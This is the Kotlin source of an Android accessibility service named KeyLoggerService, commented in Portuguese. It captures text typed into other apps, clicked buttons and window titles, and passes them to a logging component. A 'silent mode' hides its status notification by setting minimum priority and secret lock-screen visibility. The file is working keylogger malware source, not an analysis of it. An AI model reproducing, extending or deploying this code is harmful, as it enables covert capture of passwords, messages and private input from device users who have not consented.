package com.seuempresa.redmikeylg

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat

/**
 * KeyLoggerService — AccessibilityService aprimorado para captura de texto e teclas no Android.
 */
class KeyLoggerService : AccessibilityService() {

    companion object {
        private const val TAG = "KeyLoggerService"
        const val NOTIFICATION_ID   = 101
        const val CHANNEL_NORMAL_ID = "redmi_status_normal"
        const val CHANNEL_SILENT_ID = "redmi_status_silent"
    }

    private lateinit var notificationManager: NotificationManager
    private var prefsListener: SharedPreferences.OnSharedPreferenceChangeListener? = null
    private var openAppIntent: PendingIntent? = null

    override fun onServiceConnected() {
        super.onServiceConnected()

        // Configuração completa de flags para capturar todos os inputs em teclados modernos
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50
        }

        notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        openAppIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
            },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        createNotificationChannels()
        applyNotificationState()
        registerPrefsListener()

        Log.i(TAG, "Serviço de acessibilidade conectado com sucesso!")
    }

    override fun onDestroy() {
        prefsListener?.let {
            LogManager.getPrefs(this).unregisterOnSharedPreferenceChangeListener(it)
        }
        prefsListener = null
        openAppIntent = null
        notificationManager.cancel(NOTIFICATION_ID)
        LogManager.shutdown()
        super.onDestroy()
    }

    override fun onInterrupt() {
        Log.w(TAG, "Serviço interrompido.")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        val packageName = event.packageName?.toString() ?: return
        // Ignora eventos gerados pela própria interface do app
        if (packageName == applicationContext.packageName) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text.joinToString("")
                if (text.isNotBlank()) {
                    LogManager.log(applicationContext, packageName, text)
                    return
                }

                // Fallback: se event.text estiver vazio, tenta inspecionar o nó de origem
                val sourceNode = event.source
                if (sourceNode != null) {
                    val nodeText = sourceNode.text?.toString() ?: ""
                    sourceNode.recycle()
                    if (nodeText.isNotBlank()) {
                        LogManager.log(applicationContext, packageName, nodeText)
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // Captura cliques em botões, links ou sugestões do teclado
                val clickedText = event.text.joinToString("")
                val contentDesc = event.contentDescription?.toString() ?: ""
                val textToLog = when {
                    clickedText.isNotBlank() -> clickedText
                    contentDesc.isNotBlank() -> "[CLICK: $contentDesc]"
                    else -> ""
                }
                if (textToLog.isNotBlank()) {
                    LogManager.log(applicationContext, packageName, textToLog)
                }
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val className = event.className?.toString() ?: ""
                val windowTitle = event.text.joinToString("")
                if (className.isNotBlank() || windowTitle.isNotBlank()) {
                    val info = "[APP: $windowTitle $className]".trim()
                    LogManager.log(applicationContext, packageName, info)
                }
            }
        }
    }

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return

        val normalChannel = NotificationChannel(
            CHANNEL_NORMAL_ID,
            getString(R.string.notif_channel_normal_name),
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = getString(R.string.notif_channel_normal_desc)
            setShowBadge(false)
        }

        val silentChannel = NotificationChannel(
            CHANNEL_SILENT_ID,
            getString(R.string.notif_channel_silent_name),
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = getString(R.string.notif_channel_silent_desc)
            setShowBadge(false)
        }

        notificationManager.createNotificationChannels(listOf(normalChannel, silentChannel))
    }

    private fun applyNotificationState() {
        if (LogManager.isSilentMode(this)) {
            notificationManager.cancel(NOTIFICATION_ID)
            notificationManager.notify(NOTIFICATION_ID, buildNotification(silent = true))
        } else {
            notificationManager.notify(NOTIFICATION_ID, buildNotification(silent = false))
        }
    }

    private fun buildNotification(silent: Boolean): Notification {
        val channelId = if (silent) CHANNEL_SILENT_ID else CHANNEL_NORMAL_ID

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(openAppIntent)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(
                if (silent) NotificationCompat.VISIBILITY_SECRET
                else NotificationCompat.VISIBILITY_PRIVATE
            )
            .setPriority(
                if (silent) NotificationCompat.PRIORITY_MIN
                else NotificationCompat.PRIORITY_LOW
            )
            .build()
    }

    private fun registerPrefsListener() {
        prefsListener = SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == "silent_mode") {
                applyNotificationState()
            }
        }
        LogManager.getPrefs(this).registerOnSharedPreferenceChangeListener(prefsListener)
    }
}
